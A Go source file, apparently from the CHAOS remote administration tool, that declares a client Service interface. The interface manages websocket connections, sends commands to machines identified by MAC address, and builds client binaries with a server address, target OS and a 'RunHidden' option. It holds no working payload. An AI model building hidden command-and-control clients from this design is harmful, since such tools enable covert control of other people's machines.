package client

import (
	"context"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
)

type (
	SendCommandInput struct {
		MacAddress string
		Request    string
	}
	SendCommandOutput struct {
		Response string
	}

	BuildClientBinaryInput struct {
		ServerAddress, ServerPort, Filename string
		RunHidden                           bool
		OSTarget                            system.OSType
	}
)

type Service interface {
	AddConnection(clientID string, connection *websocket.Conn) error
	GetConnection(clientID string) (*websocket.Conn, bool)
	RemoveConnection(clientID string) error
	SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error)
	BuildClient(BuildClientBinaryInput) (string, error)
}
